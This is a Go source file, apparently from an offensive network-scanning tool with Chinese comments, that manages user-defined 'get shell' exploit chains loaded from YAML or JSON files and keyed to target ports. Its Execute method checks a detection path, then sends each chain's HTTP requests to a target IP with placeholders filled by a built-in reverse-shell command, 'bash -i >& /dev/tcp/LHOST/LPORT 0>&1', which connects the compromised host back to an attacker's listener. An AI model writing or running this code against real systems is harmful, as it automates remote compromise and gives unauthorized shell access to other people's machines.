package scanner

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"gopkg.in/yaml.v3"
)

// ShellChainStep 拿 shell 链中的一个 HTTP 请求步骤
type ShellChainStep struct {
	Method      string `yaml:"method" json:"method"`
	Path        string `yaml:"path" json:"path"`
	Body        string `yaml:"body" json:"body"`
	ContentType string `yaml:"content_type" json:"content_type"`
}

// ShellChain 平台化拿 shell 链(数据驱动, 用户可自定义)
type ShellChain struct {
	ID          string           `yaml:"id" json:"id"`
	Name        string           `yaml:"name" json:"name"`
	Port        int              `yaml:"port" json:"port"`
	DetectPath  string           `yaml:"detect_path" json:"detect_path"`
	DetectMatch string           `yaml:"detect_match" json:"detect_match"`
	Steps       []ShellChainStep `yaml:"steps" json:"steps"`
}

// ShellChainManager 拿 shell 链管理(从 shells/ 目录加载)
type ShellChainManager struct {
	dir string
}

// DefaultShellDir 默认拿 shell 链目录
func DefaultShellDir() string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return "shells"
	}
	return filepath.Join(home, ".netscan_shells")
}

// OpenShellChainManager 打开拿 shell 链管理器
func OpenShellChainManager(dir string) *ShellChainManager {
	if dir == "" {
		dir = DefaultShellDir()
	}
	_ = os.MkdirAll(dir, 0o755)
	return &ShellChainManager{dir: dir}
}

// List 列出用户拿 shell 链
func (m *ShellChainManager) List() []ShellChain {
	var out []ShellChain
	entries, _ := os.ReadDir(m.dir)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := strings.ToLower(e.Name())
		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") && !strings.HasSuffix(name, ".json") {
			continue
		}
		if c, err := loadShellChain(filepath.Join(m.dir, e.Name())); err == nil {
			out = append(out, *c)
		}
	}
	return out
}

// Find 按端口查找匹配的拿 shell 链
func (m *ShellChainManager) Find(port int) *ShellChain {
	for _, c := range m.List() {
		if c.Port == port {
			return &c
		}
	}
	return nil
}

// Add 安装拿 shell 链文件
func (m *ShellChainManager) Add(path string) error {
	c, err := loadShellChain(path)
	if err != nil {
		return err
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	ext := filepath.Ext(path)
	return os.WriteFile(filepath.Join(m.dir, c.ID+ext), data, 0o644)
}

// Remove 卸载拿 shell 链
func (m *ShellChainManager) Remove(id string) error {
	entries, _ := os.ReadDir(m.dir)
	for _, e := range entries {
		if c, err := loadShellChain(filepath.Join(m.dir, e.Name())); err == nil && c.ID == id {
			return os.Remove(filepath.Join(m.dir, e.Name()))
		}
	}
	return fmt.Errorf("未找到拿 shell 链: %s", id)
}

// Execute 执行拿 shell 链: 检测 → 逐步请求触发反弹 shell
func (c *ShellChain) Execute(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	if c.DetectPath != "" {
		resp, err := httpGet(ip, port, c.DetectPath, timeout)
		if err != nil || (c.DetectMatch != "" && !strings.Contains(resp, c.DetectMatch)) {
			return "检测未命中"
		}
	}
	shellCmd := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", lhost, lport)
	replaceVars := func(s string) string {
		s = strings.ReplaceAll(s, "{{LHOST}}", lhost)
		s = strings.ReplaceAll(s, "{{LPORT}}", itoa(lport))
		s = strings.ReplaceAll(s, "{{SHELL_ENC}}", url.QueryEscape(shellCmd))
		s = strings.ReplaceAll(s, "{{SHELL}}", shellCmd)
		return s
	}
	for _, s := range c.Steps {
		method := s.Method
		if method == "" {
			method = "GET"
		}
		// Path 与 Body 都可能含占位符, 需同时替换
		path := replaceVars(s.Path)
		body := replaceVars(s.Body)
		_, _ = httpDo(ip, port, method, path, body, s.ContentType, timeout)
	}
	return fmt.Sprintf("已通过 %s 执行反弹 shell (回连 %s:%d)", c.Name, lhost, lport)
}

func loadShellChain(path string) (*ShellChain, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var c ShellChain
	if strings.HasSuffix(strings.ToLower(path), ".json") {
		if err := json.Unmarshal(data, &c); err != nil {
			return nil, err
		}
	} else {
		if err := yaml.Unmarshal(data, &c); err != nil {
			return nil, err
		}
	}
	if c.ID == "" {
		return nil, fmt.Errorf("拿 shell 链缺少 id")
	}
	if c.Port == 0 {
		return nil, fmt.Errorf("拿 shell 链缺少 port")
	}
	return &c, nil
}
